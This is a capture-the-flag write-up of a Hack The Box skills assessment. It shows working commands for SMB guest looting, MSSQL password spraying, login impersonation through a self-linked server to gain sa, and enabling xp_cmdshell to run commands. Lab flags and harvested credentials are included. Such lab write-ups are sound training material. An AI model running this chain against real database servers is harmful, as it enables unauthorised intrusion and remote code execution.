# Attacking Common Services — Skills Assessment III (Hard)

**Completed:** May 8, 2026
**Flag:** `HTB{46u$!n9_l!nk3d_$3rv3r$}`
**Final context:** `sa` (sysadmin) on WIN-HARD MSSQL via self-linked-server impersonation chain

---

## Scenario Recap

Single Windows Server 2019 host (`WIN-HARD`, standalone — NOT domain-joined). MSSQL 2019 with three SQL logins (`sa` disabled, `john`, `simon`) and a Windows account `fiona`. Goal is `C:\Users\Administrator\Desktop\flag.txt`.

The trick is a **two-hop MSSQL privilege escalation**:

1. fiona has `IMPERSONATE` on `john` and `simon` (server-level).
2. `john` is mapped on a **self-linked server** (`LOCAL.TEST.LINKED.SRV`) configured to authenticate as `sa`.
3. `EXEC ('...') AT [linked]` runs commands in the sa context → enable xp_cmdshell → RCE as the SQL service account → read flag.

## Attack Chain (TL;DR)

```
nmap → 135/445/1433/3389
nxc smb guest:'' --shares           → Home (READ)
smbclient -N //target/Home          → IT/Fiona/creds.txt + IT/John/{secrets,information,notes}.txt + IT/Simon/random.txt
nxc mssql spray (3 password lists)  → fiona:48Ns72!bns74@S84NNNSl  (Windows auth)
                                       fiona is NOT sysadmin
EXEC AS fiona → IMPERSONATE john,simon
EXECUTE AS LOGIN='john'; EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]  → 1 (sysadmin!)
EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE')        AT [LOCAL.TEST.LINKED.SRV]
EXECUTE AS LOGIN='john'; EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
→ HTB{46u$!n9_l!nk3d_$3rv3r$}
```

---

## Step 1 — Recon

```bash
export target=10.129.X.X
nmap -Pn -sC -sV --min-rate 2000 -oA /tmp/hard/top $target
```

Open ports:

| Port | Service |
|------|---------|
| 135  | MSRPC |
| 445  | SMB (signing not required) |
| 1433 | MSSQL 2019 RTM (`WIN-HARD`, EncryptionReq:False) |
| 3389 | RDP |

Standalone box: NetBIOS = DNS = `WIN-HARD`. No AD context.

> **STUCK NOTE:** No port 53/DNS this time, so no AXFR shortcut. Don't waste cycles trying.

## Step 2 — SMB Recon ⚡ KEY STEP

```bash
nxc smb $target -u '' -p '' --shares          # null = STATUS_ACCESS_DENIED
nxc smb $target -u 'guest' -p '' --shares     # guest = OK
```

Guest auth works → enumerable shares:

| Share | Perm |
|-------|------|
| ADMIN$ / C$ | (no access) |
| **Home** | **READ** |
| IPC$ | READ |

Spider Home:

```bash
smbclient -N //$target/Home -c 'prompt OFF; recurse ON; mget *'
```

Loot (in `/tmp/hard/home/IT/`):

```
Fiona/creds.txt        (5 "Windows Creds")
John/secrets.txt       (5 "Password Lists")
John/notes.txt         (HTB blurb — junk)
John/information.txt   (TODO: "linked server" + "impersonation"  ← HUGE HINT)
Simon/random.txt       (5 "Credentials")
```

> **STUCK NOTE:** Always try `guest:''` after a null session denial on Windows. Server 2019 commonly has `guest` enabled but `null` disabled. nxc reports `[+] guest:` — that's a successful auth, not a "no creds" message.

## Step 3 — Build Combined Wordlist & Spray MSSQL

Combine all 15 candidate passwords from the 3 files; users = `sa, john, fiona, simon, administrator`.

```bash
nxc mssql $target -u /tmp/hard/users.txt -p /tmp/hard/pws.txt \
  --local-auth --continue-on-success
```

Result: `WIN-HARD\fiona : 48Ns72!bns74@S84NNNSl`

> **STUCK NOTE:** `nxc mssql --local-auth` makes nxc auth as a **Windows local account**. fiona is a Windows account with a SQL login mapped to it — this is required because:
> - Without `--local-auth`, nxc tries to auth as `WIN-HARD\Guest` (whatever your Windows context is).
> - `sa` is **disabled** on this box (`is_disabled=1`), so spraying SQL logins is futile.
>
> Don't waste time on POP3/SSH/etc. — only ports 445/1433/3389 are open.

## Step 4 — Enumerate fiona's MSSQL Permissions ⚡ KEY STEP

```bash
nxc mssql $target -u fiona -p '...' -q "SELECT IS_SRVROLEMEMBER('sysadmin'), SYSTEM_USER"
# → 0   WIN-HARD\Fiona       (NOT sysadmin)

# Who can fiona impersonate?
nxc mssql $target -u fiona -p '...' -q "
  SELECT distinct b.name FROM sys.server_permissions a
  JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id
  WHERE a.permission_name='IMPERSONATE'"
# → john, simon

# Linked servers?
nxc mssql $target -u fiona -p '...' -q "SELECT name FROM sys.servers"
# → WINSRV02\SQLEXPRESS  (DATA ACCESS off — dead end)
# → LOCAL.TEST.LINKED.SRV (self-link!)
```

The `information.txt` hint pays off: **linked server + impersonation**.

## Step 5 — The Self-Linked-Server Trick ⚡ THE ANSWER

The `LOCAL.TEST.LINKED.SRV` link points back to **the same instance**, but is configured with a *different* login mapping. We need to identify whose context the link runs as.

`OPENQUERY` fails for fiona directly:
```
[-] Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'
```

But **`EXEC ('...') AT`** as `john`:
```sql
EXECUTE AS LOGIN='john';
EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
-- → 1   (sysadmin!)
```

The link is mapped so that **john's incoming connection arrives back as sa**. Classic MSSQL "double-hop sysadmin via self-linked server" pattern.

> **STUCK NOTE:** Two gotchas here:
>
> 1. **`OPENQUERY` vs `EXEC AT`** behave differently with linked-server auth. If `OPENQUERY` returns "Login failed for NT AUTHORITY\ANONYMOUS LOGON", switch to `EXEC ('...') AT [link]`. The latter forwards the impersonation context properly.
> 2. **`EXEC AS LOGIN='john'`** must come BEFORE the `EXEC AT`, in the same batch. nxc sends each `-q` as one batch, so chain them with `;`.
> 3. Doubled single quotes inside `EXEC ('...')` because everything is one string literal.

## Step 6 — RCE & Flag

```sql
-- Enable xp_cmdshell on the linked srv (we're sa over there)
EXECUTE AS LOGIN='john';
EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]

EXECUTE AS LOGIN='john';
EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]

-- Read flag
EXECUTE AS LOGIN='john';
EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
-- → HTB{46u$!n9_l!nk3d_$3rv3r$}
```

> **STUCK NOTE:** Run the three statements as **three separate `nxc -q` calls** (or chain with `;` in one batch). Don't combine multiple `sp_configure` lines inside a single `EXEC ('...')` — MSSQL choked on it ("Incorrect syntax near 'sp_configure'") because of how the doubled-quote string was getting parsed.
>
> Backslash-escape gotcha: zsh ate `\U` and `\D` in the path on first attempt. Use **single quotes** for the outer shell argument and pass the SQL with `\\` doubled, OR write the SQL to a heredoc/file.

---

## Quick-Reference One-Liner

```bash
target=10.129.X.X; U=fiona; P='48Ns72!bns74@S84NNNSl'
# Recon
nxc smb $target -u guest -p '' --shares
smbclient -N //$target/Home -c 'prompt OFF; recurse ON; mget *'

# Spray
nxc mssql $target -u /tmp/hard/users.txt -p /tmp/hard/pws.txt --local-auth --continue-on-success

# Enum perms
nxc mssql $target -u $U -p $P -q "SELECT IS_SRVROLEMEMBER('sysadmin')"
nxc mssql $target -u $U -p $P -q "SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE'"
nxc mssql $target -u $U -p $P -q "SELECT name FROM sys.servers"

# Privesc + RCE via self-linked server
for sql in \
  "EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''show advanced options'',1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]" \
  "EXECUTE AS LOGIN='john'; EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]" \
  "EXECUTE AS LOGIN='john'; EXEC ('xp_cmdshell ''type C:\\Users\\Administrator\\Desktop\\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]"; do
    nxc mssql $target -u $U -p $P -q "$sql"
done
```

---

## What Took Me Down a Rabbit Hole

**Almost nothing.** The Easy/Medium lessons all paid dividends:
1. SMB guest enum **before** brute (lesson from Easy → enum first)
2. Combined-wordlist spray of harvested passwords across **all** users (lesson from Medium → loot first, spray broad)
3. `information.txt` literally said "linked server" and "impersonation" — read the loot, don't skim it

The only real time-sink was the `OPENQUERY` vs `EXEC AT` distinction. `OPENQUERY` failed with `ANONYMOUS LOGON` and made me think the link was broken; switching to `EXEC ('...') AT` immediately worked.

**Forever rule for MSSQL boxes:**
> 1. `IS_SRVROLEMEMBER('sysadmin')` first.
> 2. If 0 → enum `sys.server_permissions` for IMPERSONATE grants.
> 3. Enum `sys.servers` for linked servers.
> 4. For each impersonatable login × each linked server, try `EXECUTE AS LOGIN='X'; EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [link]`.
> 5. The first row that returns `1` is your sysadmin path.

---

## ACS Skills Series Recap

| Box    | Foothold             | Privesc                                     | Flag                                          |
|--------|----------------------|---------------------------------------------|-----------------------------------------------|
| Easy   | smtp-user-enum + ftp | Core FTP HTTPS path-traversal PUT → SYSTEM | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`     |
| Medium | anon-FTP loot        | cred reuse → ssh                           | `HTB{1qay2wsx3EDC4rfv_M3D1UM}`                |
| Hard   | SMB guest loot       | MSSQL impersonation → self-linked srv → sa | `HTB{46u$!n9_l!nk3d_$3rv3r$}`                 |
